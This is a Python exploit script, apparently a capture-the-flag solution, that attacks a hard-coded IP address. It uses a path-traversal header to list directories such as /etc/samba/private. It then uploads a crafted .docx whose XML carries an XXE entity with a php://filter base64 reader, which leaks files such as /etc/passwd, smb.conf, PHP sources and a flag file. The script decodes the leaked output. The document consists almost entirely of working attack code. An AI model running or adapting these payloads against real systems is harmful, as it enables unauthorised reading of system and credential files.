from StringIO import StringIO

import requests, zipfile, base64

# headers = {"Directory": "../../../"}
# headers = {"Directory": "../../../vh18957253/"}
# headers = {"Directory": "../../../vh18957253/public_html/"}
headers = {"Directory": "../../../../etc/samba/private"}

res = requests.get("http://128.199.40.185/showFiles", headers=headers)

print res.content

# path = "php://filter/read=convert.base64-encode/resource=/opt/vh18957253/public_html/panelManager-0.1/index.php"
# path = "php://filter/read=convert.base64-encode/resource=/opt/vh18957253/public_html/index.php"
# path = "php://filter/read=convert.base64-encode/resource=/opt/fileserver/phtml/sfiles.php"
# path = "php://filter/read=convert.base64-encode/resource=/proc/self/cmdline"
# path = "php://filter/read=convert.base64-encode/resource=/etc/samba/smb.conf"
# path = "php://filter/read=convert.base64-encode/resource=/etc/passwd"
path = "php://filter/read=convert.base64-encode/resource=/fileSharing/s3cRetP4th/flagIsHeregRabiT.flag"

data = """<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
 <!DOCTYPE w:t [  
  <!ENTITY xxe SYSTEM \"""" + path + """\" >]>
<w:document xmlns:ve="http://schemas.openxmlformats.org/markup-compatibility/2006" xmlns:o="urn:schemas-microsoft-com:office:office" xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships" xmlns:m="http://schemas.openxmlformats.org/officeDocument/2006/math" xmlns:v="urn:schemas-microsoft-com:vml" xmlns:wp="http://schemas.openxmlformats.org/drawingml/2006/wordprocessingDrawing" xmlns:w10="urn:schemas-microsoft-com:office:word" xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main" xmlns:wne="http://schemas.microsoft.com/office/word/2006/wordml"><w:body><w:p w:rsidR="00332BA2" w:rsidRDefault="00B63EA6" w:rsidP="00217028"><w:pPr><w:pStyle w:val="Title"/><w:outlineLvl w:val="0"/></w:pPr><w:bookmarkStart w:id="0" w:name="OLE_LINK1"/><w:bookmarkStart w:id="1" w:name="OLE_LINK2"/><w:bookmarkStart w:id="2" w:name="_Toc359077851"/><w:r><w:t>&xxe;</w:t></w:r><w:bookmarkEnd w:id="2"/></w:p><w:bookmarkEnd w:id="0"/><w:bookmarkEnd w:id="1"/><w:p w:rsidR="006535FC" w:rsidRDefault="006535FC" w:rsidP="006535FC"><w:pPr><w:ind w:left="1440" w:firstLine="0"/></w:pPr></w:p><w:p w:rsidR="008920B2" w:rsidRPr="005E116B" w:rsidRDefault="008920B2" w:rsidP="002E7C7C"><w:pPr><w:rPr><w:rStyle w:val="SubtleEmphasis"/></w:rPr></w:pPr></w:p><w:sectPr w:rsidR="008920B2" w:rsidRPr="005E116B" w:rsidSect="00332BA2"><w:pgSz w:w="12240" w:h="15840"/><w:pgMar w:top="1440" w:right="1440" w:bottom="1440" w:left="1440" w:header="720" w:footer="720" w:gutter="0"/><w:cols w:space="720"/><w:docGrid w:linePitch="360"/></w:sectPr></w:body></w:document>"""

s = StringIO()
zf = zipfile.ZipFile(s, "w")
zf.writestr("word/document.xml", data)
zf.close()

files = {"newFile": ("test.docx", s.getvalue(), "application/vnd.openxmlformats-officedocument.wordprocessingml.document")}

res = requests.post("http://128.199.40.185:8081/panelManager-0.1/", files=files)

print res.content

data = res.content.split("Thank you, the result will be mailed to <b>")[1].split("</b>.  We're processing your file...")[0]
print base64.b64decode(data)